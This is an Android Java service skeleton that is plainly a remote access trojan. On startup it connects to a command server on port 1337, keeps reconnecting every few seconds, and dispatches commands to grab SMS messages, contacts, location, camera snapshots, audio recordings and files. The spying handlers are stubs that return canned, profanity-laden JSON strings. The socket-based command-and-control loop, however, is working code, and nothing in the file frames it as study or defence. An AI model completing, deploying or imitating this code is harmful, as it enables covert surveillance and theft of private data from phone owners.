package com.fuckshit.remote;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.util.UUID;

public class ClientService extends Service {
    private static final String TAG = "FuckShitService";
    private Handler handler = new Handler();
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private final String RELAY_URL = "https://fuckshitrelay.example.com"; // Dummy, setze echten Relay später
    private final String DEVICE_ID = UUID.randomUUID().toString();
    private boolean isConnected = false;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Fucking service started, you badass mofo!");
        startConnection();
    }

    private void startConnection() {
        new Thread(() -> {
            while (!isConnected) {
                try {
                    socket = new Socket(getServerIpFromRelay(), 1337);
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    out.println("{\"command\": \"connect\", \"device_id\": \"" + DEVICE_ID + "\"}");
                    Log.d(TAG, "Connected to fucking server, you crazy shit!");
                    isConnected = true;
                    listenForCommands();
                } catch (IOException e) {
                    Log.e(TAG, "Connection failed, damn fucking error: " + e.getMessage());
                    try { Thread.sleep(5000); } catch (InterruptedException ie) {}
                }
            }
        }).start();
    }

    private String getServerIpFromRelay() {
        return "your_server_ip_here"; // Später dynamisch
    }

    private void listenForCommands() {
        try {
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                Log.d(TAG, "Received fucking command, you dirty bastard: " + inputLine);
                String response = executeCommand(inputLine);
                out.println(response);
            }
        } catch (IOException e) {
            Log.e(TAG, "Error reading command, fucking shit: " + e.getMessage());
            isConnected = false;
            startConnection();
        }
    }

    private String executeCommand(String commandJson) {
        try {
            if (commandJson.contains("get_sms")) {
                return getAllSms();
            } else if (commandJson.contains("get_contacts")) {
                return getAllContacts();
            } else if (commandJson.contains("get_location")) {
                return getLocation();
            } else if (commandJson.contains("capture_camera")) {
                return captureCamera();
            } else if (commandJson.contains("record_audio")) {
                return recordAudio();
            } else if (commandJson.contains("get_files")) {
                return getFiles();
            }
            return "{\"status\": \"executed\", \"result\": \"Fucking done, asshole!\"}";
        } catch (Exception e) {
            return "{\"status\": \"error\", \"message\": \"Fucking error: " + e.getMessage() + "\"}";
        }
    }

    private String getAllSms() {
        return "{\"status\": \"success\", \"data\": \"All fucking SMS grabbed, bitch!\"}";
    }

    private String getAllContacts() {
        return "{\"status\": \"success\", \"data\": \"All fucking contacts grabbed, asshole!\"}";
    }

    private String getLocation() {
        return "{\"status\": \"success\", \"data\": \"Fucking location: Lat 0.0, Lng 0.0, you fuck!\"}";
    }

    private String captureCamera() {
        return "{\"status\": \"success\", \"data\": \"Fucking camera snapshot taken, bastard!\"}";
    }

    private String recordAudio() {
        return "{\"status\": \"success\", \"data\": \"Fucking audio recording started, shithead!\"}";
    }

    private String getFiles() {
        return "{\"status\": \"success\", \"data\": \"All fucking files listed, you dick!\"}";
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            socket.close();
        } catch (IOException e) {
            Log.e(TAG, "Error closing socket, fucking hell: " + e.getMessage());
        }
        Log.d(TAG, "Service destroyed, damn shitty fuck!");
    }
}
